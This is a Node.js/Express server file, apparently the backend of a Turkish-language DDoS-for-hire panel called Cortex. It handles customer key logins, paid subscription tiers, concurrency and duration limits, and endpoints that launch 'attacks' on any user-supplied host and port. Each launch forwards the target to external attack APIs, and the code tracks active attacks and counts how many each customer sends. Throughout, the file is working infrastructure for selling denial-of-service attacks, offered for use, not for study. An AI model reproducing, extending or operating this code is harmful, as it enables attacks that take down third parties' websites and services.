const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;
const ROOT = __dirname;
const PUBLIC = path.join(ROOT, 'public');
const DATA = path.join(ROOT, 'data');
const JSON_DIR = path.join(ROOT, 'json');
const ACTIVE_ATTACKS_FILE = 'active-attacks.json';

// Server'in gercekten basladigi an
const SERVER_START = Date.now();

function readJson(file, fallback = null) {
  const filePath = path.join(DATA, file);
  if (!fs.existsSync(filePath)) {
    if (fallback === null) throw new Error(`${file} not found.`);
    return fallback;
  }
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

function readJsonDir(file, fallback = null) {
  const filePath = path.join(JSON_DIR, file);
  if (!fs.existsSync(filePath)) {
    if (fallback === null) throw new Error(`${file} not found.`);
    return fallback;
  }
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

function writeJson(file, data) {
  fs.writeFileSync(path.join(DATA, file), JSON.stringify(data, null, 2));
}

function getActiveAttacks() {
  const now = Date.now();
  const db = readJson(ACTIVE_ATTACKS_FILE, { attacks: [] });
  const attacks = Array.isArray(db.attacks) ? db.attacks : [];
  const active = attacks.filter(attack => {
    const startedAt = Number(attack.startedAt);
    const duration = Number(attack.duration);
    return Number.isFinite(startedAt)
      && Number.isFinite(duration)
      && duration > 0
      && startedAt + duration * 1000 > now;
  });

  if (active.length !== attacks.length) {
    writeJson(ACTIVE_ATTACKS_FILE, { attacks: active });
  }

  return active;
}

function findUserByKey(key) {
  if (!key?.trim()) return null;
  const db = readJson('users.json');
  return db.users.find(u => u.key === key.trim()) || null;
}

function publicAttack(attack) {
  return {
    id: attack.id,
    method: attack.method,
    target: attack.target,
    port: attack.port,
    duration: attack.duration,
    startedAt: attack.startedAt,
    node: attack.node,
    owner: attack.owner,
    ownerUid: attack.ownerUid
  };
}

// Increment user and system attack counters in users.json
function incrementAttackStats(user) {
  try {
    const usersDb = readJson('users.json');
    const idx = usersDb.users.findIndex(u => u.uid === user.uid);
    if (idx !== -1) {
      if (!usersDb.users[idx].stats) usersDb.users[idx].stats = { totalApiSends: 0, totalRequests: 0 };
      usersDb.users[idx].stats.totalApiSends = (usersDb.users[idx].stats.totalApiSends || 0) + 1;
      usersDb.users[idx].stats.totalRequests = (usersDb.users[idx].stats.totalRequests || 0) + 1;
    }
    if (!usersDb.system) usersDb.system = {};
    usersDb.system.totalApiSends = (usersDb.system.totalApiSends || 0) + 1;
    writeJson('users.json', usersDb);
  } catch (_) {}
}

// Fire-and-forget external HTTP/HTTPS request
function fireUrl(url) {
  try {
    const lib = url.startsWith('https') ? https : http;
    const req = lib.get(url, res => { res.resume(); });
    req.on('error', () => {});
    req.setTimeout(10000, () => { req.destroy(); });
  } catch (_) {}
}

// Fire all API URLs for a method simultaneously
function fireAllUrls(method, host, port, time) {
  const urls = Array.isArray(method.api_urls) ? method.api_urls : [];
  // Backward compat: also support single api_url
  if (!urls.length && method.api_url) urls.push(method.api_url);
  for (const tpl of urls) {
    const finalUrl = buildApiUrl(tpl, host, port, time);
    fireUrl(finalUrl);
  }
}

// Build external API URL from method template with replacements
function buildApiUrl(apiUrlTemplate, host, port, time) {
  return apiUrlTemplate
    .replace(/<host>/g, encodeURIComponent(String(host).trim()))
    .replace(/<port>/g, String(port))
    .replace(/<time>/g, String(time));
}

// Detect target type: 'ip', 'http', 'https'
function detectTargetType(target) {
  const t = String(target).trim().toLowerCase();
  if (t.startsWith('https://')) return 'https';
  if (t.startsWith('http://')) return 'http';
  // Bare IP or hostname → treat as IP
  return 'ip';
}

// Check if a method allows the given target type
function isTargetAllowed(method, targetType) {
  // If the method has no restrictions (all false), allow everything
  const hasAny = method.ip || method.http || method.https;
  if (!hasAny) return true;
  if (targetType === 'ip') return !!method.ip;
  if (targetType === 'http') return !!method.http;
  if (targetType === 'https') return !!method.https;
  return true;
}

// Check if user has permission to use a method (vip/star/admin)
function checkMethodPermission(method, user) {
  if (method.vip && !user.vip) return 'Bu method VIP kullanıcılara özgüdür.';
  if (method.star && !user.star) return 'Bu method Star kullanıcılara özgüdür.';
  if (method.admin && !user.admin) return 'Bu method Admin kullanıcılara özgüdür.';
  return null;
}

app.use(express.json());
app.use(express.static(PUBLIC));

app.get('/', (req, res) => {
  res.sendFile(path.join(PUBLIC, 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(PUBLIC, 'dashboard.html'));
});

app.post('/api/auth', (req, res) => {
  const { key } = req.body || {};
  if (!key?.trim()) {
    return res.status(400).json({ error: 'Key gerekli.' });
  }

  const user = findUserByKey(key);

  if (!user) {
    return res.status(401).json({ error: 'Geçersiz key. Lütfen tekrar deneyin.' });
  }

  if (!user.subscription?.active) {
    return res.status(403).json({ error: 'Aboneliğiniz sona ermiş. Yöneticinizle iletişime geçin.' });
  }

  res.json({ user });
});

app.get('/api/system', (req, res) => {
  const usersDb = readJson('users.json', { users: [], system: {} });
  const methodsList = readJsonDir('methods.json', []);

  // Tum kullanicilarin saldiri sayilarini topla
  const totalAttacks = usersDb.users.reduce(
    (sum, u) => sum + (u.stats?.totalApiSends || 0), 0
  );

  res.json({
    startedAt: new Date(SERVER_START).toISOString(),
    totalCustomers: usersDb.users.length,
    totalMethods: methodsList.length,
    totalApiSends: totalAttacks
  });
});

// Methods artık json/methods.json'dan okunuyor
app.get('/api/methods', (req, res) => {
  res.json(readJsonDir('methods.json', []));
});

app.get('/api/config', (req, res) => {
  res.json(readJsonDir('config.json', { global_slots: 0 }));
});

app.get('/api/active-attacks', (req, res) => {
  res.json({ attacks: getActiveAttacks().map(publicAttack) });
});

// Web UI üzerinden saldırı başlatma (Send API sayfası)
app.post('/api/active-attacks', (req, res) => {
  const { key, method, target, port, duration } = req.body || {};
  const user = findUserByKey(key);
  if (!user) {
    return res.status(401).json({ error: 'Gecersiz key.' });
  }

  if (!user.subscription?.active) {
    return res.status(403).json({ error: 'Aboneliginiz sona ermis.' });
  }

  if (!target?.trim()) {
    return res.status(400).json({ error: 'Target gerekli.' });
  }

  const jsonMethods = readJsonDir('methods.json', []);
  const selectedMethod = jsonMethods.find(item => item.name === method);
  if (!selectedMethod) {
    return res.status(400).json({ error: 'Gecersiz method.' });
  }

  // Permission kontrolü (vip/star/admin)
  const permError = checkMethodPermission(selectedMethod, user);
  if (permError) {
    return res.status(403).json({ error: permError });
  }

  // Target type kontrolü (ip/http/https)
  const targetType = detectTargetType(target);
  if (!isTargetAllowed(selectedMethod, targetType)) {
    const allowed = [];
    if (selectedMethod.ip) allowed.push('IP');
    if (selectedMethod.http) allowed.push('HTTP');
    if (selectedMethod.https) allowed.push('HTTPS');
    return res.status(400).json({ error: `Bu method sadece ${allowed.join(', ')} hedeflerini destekler.` });
  }

  const config = readJsonDir('config.json', { global_slots: 0 });
  const active = getActiveAttacks();
  const globalLimit = Math.max(0, parseInt(config?.global_slots ?? 0, 10) || 0);
  const userLimit = Math.max(0, parseInt(user?.concurrent ?? 0, 10) || 0);
  const userActiveCount = active.filter(attack => attack.ownerUid === user.uid).length;

  if (globalLimit && active.length >= globalLimit) {
    return res.status(429).json({ error: 'Global slot limiti dolu.' });
  }

  if (userLimit && userActiveCount >= userLimit) {
    return res.status(429).json({ error: 'My Concurrents limiti dolu.' });
  }

  const requestedDuration = Math.max(1, parseInt(duration || '60', 10) || 60);
  const maxDuration = Math.max(1, parseInt(user.attack_time ?? requestedDuration, 10) || requestedDuration);
  const finalDuration = Math.min(requestedDuration, maxDuration);
  const portNum = Math.max(1, Math.min(65535, parseInt(port || '80', 10) || 80));

  const attack = {
    id: 'cx-' + Math.random().toString(36).slice(2, 10).toUpperCase(),
    method: selectedMethod.name,
    target: target.trim().slice(0, 180),
    port: portNum,
    duration: finalDuration,
    startedAt: Date.now(),
    node: 'EU-WEST-1',
    owner: user.username,
    ownerUid: user.uid
  };

  const attacks = [attack, ...active].slice(0, globalLimit || active.length + 1);
  writeJson(ACTIVE_ATTACKS_FILE, { attacks });

  // Kullanıcı ve sistem istatistiklerini güncelle
  incrementAttackStats(user);

  // Tüm dış API'leri aynı anda çağır (fire & forget)
  fireAllUrls(selectedMethod, target.trim(), portNum, finalDuration);

  // Güncel user verisini döndür (stats güncel olsun)
  const updatedUser = findUserByKey(user.key);
  res.status(201).json({ attack: publicAttack(attack), attacks: attacks.map(publicAttack), user: updatedUser });
});

// Kullanıcının API key ile dışarıdan kullanabileceği endpoint
// GET /api/attack?key=&host=&port=&time=&method=
app.get('/api/attack', (req, res) => {
  const { key, host, port, time, method } = req.query;

  const user = findUserByKey(key);
  if (!user) {
    return res.status(401).json({ error: 'Geçersiz key.' });
  }

  if (!user.subscription?.active) {
    return res.status(403).json({ error: 'Aboneliğiniz sona ermiş.' });
  }

  if (!user.api_access) {
    return res.status(403).json({ error: 'API erişiminiz bulunmuyor.' });
  }

  if (!host?.trim()) {
    return res.status(400).json({ error: 'Host parametresi gerekli.' });
  }

  if (!method?.trim()) {
    return res.status(400).json({ error: 'Method parametresi gerekli.' });
  }

  const jsonMethods = readJsonDir('methods.json', []);
  const selectedMethod = jsonMethods.find(
    m => m.name === method || m.name.toLowerCase() === method.toLowerCase()
  );
  if (!selectedMethod) {
    return res.status(400).json({ error: 'Geçersiz method. Mevcut methodlar için /api/methods endpoint\'ini kontrol edin.' });
  }

  // Permission kontrolü (vip/star/admin)
  const permError = checkMethodPermission(selectedMethod, user);
  if (permError) {
    return res.status(403).json({ error: permError });
  }

  // Target type kontrolü (ip/http/https)
  const targetType = detectTargetType(host);
  if (!isTargetAllowed(selectedMethod, targetType)) {
    const allowed = [];
    if (selectedMethod.ip) allowed.push('IP');
    if (selectedMethod.http) allowed.push('HTTP');
    if (selectedMethod.https) allowed.push('HTTPS');
    return res.status(400).json({ error: `Bu method sadece ${allowed.join(', ')} hedeflerini destekler.` });
  }

  const config = readJsonDir('config.json', { global_slots: 0 });
  const active = getActiveAttacks();
  const globalLimit = Math.max(0, parseInt(config?.global_slots ?? 0, 10) || 0);
  const userLimit = Math.max(0, parseInt(user?.concurrent ?? 0, 10) || 0);
  const userActiveCount = active.filter(a => a.ownerUid === user.uid).length;

  if (globalLimit && active.length >= globalLimit) {
    return res.status(429).json({ error: 'Global slot limiti dolu.' });
  }

  if (userLimit && userActiveCount >= userLimit) {
    return res.status(429).json({ error: 'Concurrent limit doldu.' });
  }

  const requestedDuration = Math.max(1, parseInt(time || '60', 10) || 60);
  const maxDuration = Math.max(1, parseInt(user.attack_time ?? requestedDuration, 10) || requestedDuration);
  const finalDuration = Math.min(requestedDuration, maxDuration);
  const portNum = Math.max(1, Math.min(65535, parseInt(port || '80', 10) || 80));

  const attack = {
    id: 'cx-' + Math.random().toString(36).slice(2, 10).toUpperCase(),
    method: selectedMethod.name,
    target: host.trim().slice(0, 180),
    port: portNum,
    duration: finalDuration,
    startedAt: Date.now(),
    node: 'EU-WEST-1',
    owner: user.username,
    ownerUid: user.uid
  };

  const attacks = [attack, ...active].slice(0, globalLimit || active.length + 1);
  writeJson(ACTIVE_ATTACKS_FILE, { attacks });

  // Kullanıcı ve sistem istatistiklerini güncelle
  incrementAttackStats(user);

  // Tüm dış API'leri aynı anda çağır (fire & forget)
  fireAllUrls(selectedMethod, host.trim(), portNum, finalDuration);

  res.json({
    success: true,
    attack: publicAttack(attack),
    message: `Attack started: ${selectedMethod.name} → ${host.trim()}:${portNum} for ${finalDuration}s`
  });
});

const server = app.listen(PORT, () => {
  console.log(`Cortex → http://localhost:${PORT}`);
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\nPort ${PORT} kullanımda. Eski sunucuyu kapatın:`);
    console.error(`  Get-NetTCPConnection -LocalPort ${PORT} | Stop-Process -Id {PID} -Force`);
    console.error(`  veya: $env:PORT=3001; node server.js\n`);
    process.exit(1);
  }
  throw err;
});
